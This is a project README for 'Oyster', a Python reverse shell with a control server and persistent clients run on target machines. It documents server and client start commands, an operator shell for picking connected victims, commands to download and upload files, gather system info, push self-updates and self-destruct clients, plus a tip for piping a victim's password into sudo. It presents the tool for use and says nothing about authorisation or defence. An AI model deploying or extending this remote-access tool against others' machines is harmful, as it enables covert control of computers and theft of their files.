```python
 .oOOOo.
.O     o.
O       o               O
o       O              oOo
O       o O   o .oOo    o   .oOo. `OoOo.
o       O o   O `Ooo.   O   OooO'  o
`o     O' O   o     O   o   O      O
 `OoooO'  `OoOO `OoO'   `oO `OoO'  o
              o
           OoO'
```

Oyster is a lightweight multi-threaded reverse shell written in pure 
python 3.  The server can push updates to the clients, and the clients 
will overwrite/restart themselves.  Client/Server/Server Shell commands 
can also be added using the plugin system.

I wrote this after finding an example reverse shell on the thenewboston 
youtube channel.  I saw some things I wanted to improve, so that's what 
I attempted to do.  The clients will continuously try to make a 
connection with the server.

## Control Server

Start `server.py` from the command line.  Here are the keyword arguments 
used for `server.py`:

```
host        - Host IP address.
port        - Host port.
recv_size   - Buffer size for receiving and sending data.
listen      - Maximum number of queued connections.
bind_retry  - How many times to retry binding the socket to the port.
```

Example:

All of the arguments provided below are the defaults except `host`, 
which is a blank string as the default.

```
python3 server.py host=0.0.0.0 port=6667 recv_size=1024 listen=10 bind_retry=5
```

You can also modify the `server.py` & `client.py` file directly to 
hardcode the information into the starting variables if that is your
thing.

## Oyster Shell

The Oyster Shell is the main interface.  It's what you use to select 
which clients you would like to send commands to, and push updates to 
the `client.py` file on all of the connected target machines.  You know
you're working with the Oyster Shell if you see the following prompt:

```
Oyster> 
```

Commands for the `Oyster` shell are:

```
list                        -   List the connected clients.
    
update all                  -   Update all the connected clients using 
                                `update.py`.  Clients will overwrite 
                                themselves and reboot themselves.
                                
use {target ip/index}       -   Use a target connection.  {target ip/index} 
                                can be found by running the `list` command.

upload                      -   Upload a file to a client.

plugins -r                  -   Reload all plugins.

plugins -l                  -   List all plugins.

plugins -ls                 -   List all server plugins.

plugins -lsh                -   List all oyster shell plugins
                                
quit                        -   Shut everything down.
```

### Oyster Shell's `use` Command

The `use` command will drop you into a client shell.  This is used to 
navigate and manipulate the client's computer.  Once executed, the `use` 
command will drop you into a shell for the given connection[ip address 
or index givin by the `list` command].  You'll know you're in a client 
shell when you see an ip address along with a directory structure with a
`> ` at the end:

```
<10.0.0.8> /Some/Directory> 
```


To get out of the connection's shell, run the `quit` command.  This will 
take you back to the `Oyster` shell.

Example:

```
Oyster> use 10.0.0.8
<10.0.0.8> /Users/SomeUser/Remote/Computer/Where/Client.py/Is/Stashed> quit
Oyster> 
```

### Client Shell Commands

There are other client shell commands besides `quit`:

```
get "{target filepath}" "{local filepath}"      -   Download a file from 
                                                    the target.

upload {local filepath} {target filepath}       -   Upload a file to the
                                                    target.

sysinfo                                         -   Get system info from
                                                    the target.

plugins -r                                      -   Reload all plugins.

plugins -l                                      -   List all plugins.  
                                             
oyster reboot                                   -   Reboot the selected
                                                    client.
                                                    
oyster self-destruct                            -   Removes the client 
```

Example:

```
Oyster> use 10.0.0.8
<10.0.0.8> /Users/SomeUser/Where/The/Client/Is/Stashed> get ~/Music/song.m4a song.m4a
< File Stashed: song.m4a >
<10.0.0.8> /Users/SomeUser/Where/The/Client/Is/Stashed> 
```

### Adding Client/Server/Shell Commands

A plugin api is available for adding client/server/server shell commands.  
The `get` command is actually implemented as a plugin.  Check out the 
`Get.py` file in the `client_plugins` folder for an [example plugin](https://github.com/Wykleph/Oyster/blob/master/client_plugins/Get.py).


#### Plugin Design

In order to know how to write plugins, you probably need some basic info 
on how everything works under the hood.

The basic idea is that a `command`/`data` is dispatched to the `client` 
from the `server`, and then the `client` responds with a `result` and 
waits for another `command`. The `client` _must_ respond with _something_,
even if it is a blank string.  A lot of commands can be implemented with 
a client-side plugin, however in certain cases a `server` plugin, or 
Oyster `shell` plugin would be required for more advanced functionality(
downloading files or something similar).

A client plugin must be a python file with a `Plugin` class that has a 
`version` attribute, an `invocation` attribute that tells it what 
command invokes the plugin. It must also contain an `enabled` attribute 
that can be used to disable or enable plugins.  Just change the value to 
enable or disable a plugin. A `run` method that takes an instance of the 
`Client` object and a string of `data` as the two arguments.  Example. 
This plugin tells the client to `say` something(the data just gets sent 
back to the server and printed):

```python
import shlex

class Plugin(object):
    """
    Make the client say something.
    """
    
    version = 'v1.0'
    invocation = 'say'
    enabled = True
    
    def run(self, client, data):
        args = shlex.split(data)
        
        client.server_print(' '.join(args))
```

A server/oyster shell plugin is written exactly like a client plugin, 
except the `run` method takes a `Server` instance as the first argument
instead of a `Client` instance.  The `Server` instance uses a method 
called `send_command` to send data to the `Client` instead of `send_data` 
or `server_print`.

A `shell` plugin only runs if you are in the `Oyster>` shell.  A server 
plugin runs on the server-side just before a command is sent to a client.
This enables all sorts of additional functionality like sending commands 
to all of the connected clients at once. The `Server` uses the
`ConnectionManager` to manage all of the connected `client`s. 
Documentation on the `ConnectionManager` will be coming soon.

The `client_plugins/Get.py` file is what handles the `get` command sent 
from the server.  The `server_plugins/Get.py` file handles the 
server-side implementation of the `get` command.  A simpler plugin 
example can be found in the `client_plugins/SysInfo.py` file.  It runs 
some functions to gather some basic information about the clients 
system, then sends it to the server. Be careful implementing command 
plugins as you can override an operating system's commands.  Look at the 
`ChangeDirectory` plugin in the `client_plugins` to see a good example 
of how the `cd` command is actually implemented in python, and not using 
the native OS command.

### Using `sudo` with connected clients

`echo` the password and pipe it into the `sudo` command with the `-S`
flag.

```
echo "ClientsPassword" | sudo -S chown $USER:admin /usr/local/include
```

You may need to add a newline character to the end of your password.

```
echo "ClientsPassword\n" | sudo -S chown $USER:admin /usr/local/include
```

Check out the `man` pages for `sudo` on the client if this doesn't work.
I'm not sure how much the `-S` flag differs between unix flavours.

## Client

Start `client.py` on the target machine.  The client should keep itself
up and running, unless it errors out for some odd reason.  When updates
are pushed to the client from the server, the client will overwrite
and restart itself.  It's up to the user to figure out how to get this 
to run on startup or whatever.  Here are startup arguments.

```
host
port
recv_size
```

Example:

```
python3 client.py host=10.0.0.215 port=6667 recv_size=1024
```
